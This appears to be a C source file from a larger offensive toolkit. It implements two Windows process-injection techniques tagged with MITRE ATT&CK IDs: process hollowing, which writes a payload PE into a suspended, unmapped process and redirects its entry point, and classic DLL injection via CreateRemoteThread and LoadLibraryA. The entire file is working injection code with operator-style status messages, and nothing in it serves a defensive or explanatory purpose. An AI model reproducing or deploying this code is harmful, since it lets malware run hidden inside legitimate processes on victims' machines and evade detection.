// src/injection.c
// Mod 130: Ghost process injection (T1055.012)
// Creates a suspended process, unmaps its image, writes payload,
// resumes execution from payload entry point
#include <windows.h>
#include <stdio.h>

// NtUnmapViewOfSection typedef — resolved dynamically
typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(HANDLE, PVOID);

// -- T1055.012: Process hollowing / ghost injection -------------------
BOOL ghost_inject(LPCSTR targetExe, PBYTE payload, DWORD payloadSize) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create target process in suspended state
    if (!CreateProcessA(NULL, (LPSTR)targetExe, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] ghost_inject: CreateProcess failed: %ld\n", GetLastError());
        return FALSE;
    }
    printf("[+] ghost_inject: Created suspended process PID %ld\n",
           pi.dwProcessId);

    // 2. Get thread context to find image base (PEB->ImageBaseAddress)
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] ghost_inject: GetThreadContext failed: %ld\n",
               GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    // Read the image base from PEB
    // On x64: PEB at ctx.Rdx, ImageBaseAddress at PEB+0x10
    PVOID pImageBase = NULL;
#ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                      &pImageBase, sizeof(PVOID), NULL);
#else
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                      &pImageBase, sizeof(PVOID), NULL);
#endif
    printf("[*] ghost_inject: Target image base: %p\n", pImageBase);

    // 3. Unmap the original image
    fnNtUnmapViewOfSection pNtUnmap =
        (fnNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    if (pNtUnmap) {
        pNtUnmap(pi.hProcess, pImageBase);
        printf("[+] ghost_inject: Original image unmapped\n");
    }

    // 4. Parse payload PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS pNt =
        (PIMAGE_NT_HEADERS)(payload + pDos->e_lfanew);
    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
    PVOID preferredBase = (PVOID)(ULONG_PTR)pNt->OptionalHeader.ImageBase;

    // 5. Allocate memory at preferred base in target process
    PVOID pRemoteBase = VirtualAllocEx(pi.hProcess, preferredBase,
                                       imageSize, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!pRemoteBase) {
        // Try any address if preferred is taken
        pRemoteBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    }
    if (!pRemoteBase) {
        printf("[!] ghost_inject: VirtualAllocEx failed: %ld\n",
               GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    printf("[+] ghost_inject: Allocated %ld bytes at %p\n",
           imageSize, pRemoteBase);

    // 6. Write PE headers
    WriteProcessMemory(pi.hProcess, pRemoteBase, payload,
                       pNt->OptionalHeader.SizeOfHeaders, NULL);

    // 7. Write sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                           (PBYTE)pRemoteBase + pSection[i].VirtualAddress,
                           payload + pSection[i].PointerToRawData,
                           pSection[i].SizeOfRawData, NULL);
    }

    // 8. Update PEB->ImageBaseAddress
#ifdef _WIN64
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                       &pRemoteBase, sizeof(PVOID), NULL);
    // 9. Set entry point
    ctx.Rcx = (DWORD64)pRemoteBase +
              pNt->OptionalHeader.AddressOfEntryPoint;
#else
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                       &pRemoteBase, sizeof(PVOID), NULL);
    ctx.Eax = (DWORD)pRemoteBase +
              pNt->OptionalHeader.AddressOfEntryPoint;
#endif

    // 10. Set context and resume
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    printf("[+] ghost_inject: Payload injected and resumed in PID %ld\n",
           pi.dwProcessId);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

// -- T1055.001: Classic DLL injection (simpler fallback) --------------
BOOL dll_inject(DWORD targetPid, LPCSTR dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        printf("[!] dll_inject: OpenProcess failed: %ld\n", GetLastError());
        return FALSE;
    }

    SIZE_T pathLen = strlen(dllPath) + 1;
    PVOID pRemote = VirtualAllocEx(hProcess, NULL, pathLen,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
    if (!pRemote) {
        printf("[!] dll_inject: VirtualAllocEx failed\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    WriteProcessMemory(hProcess, pRemote, dllPath, pathLen, NULL);

    FARPROC pLoadLib = GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLib,
        pRemote, 0, NULL);

    if (!hThread) {
        printf("[!] dll_inject: CreateRemoteThread failed: %ld\n",
               GetLastError());
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] dll_inject: DLL injected into PID %ld\n", targetPid);
    return TRUE;
}
